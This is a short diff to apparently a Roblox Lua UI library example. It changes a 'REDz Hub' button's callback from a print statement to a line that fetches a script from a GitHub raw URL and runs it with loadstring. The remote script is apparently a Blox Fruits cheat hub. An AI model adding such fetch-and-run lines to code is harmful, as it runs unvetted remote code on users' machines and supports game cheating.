@@ -136,7 +136,7 @@ PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
 DBTab:AddButton({
 	Name = "REDz Hub",
 	Callback = function()
-      		print("button pressed")
+      		loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
   	end    
 })
 
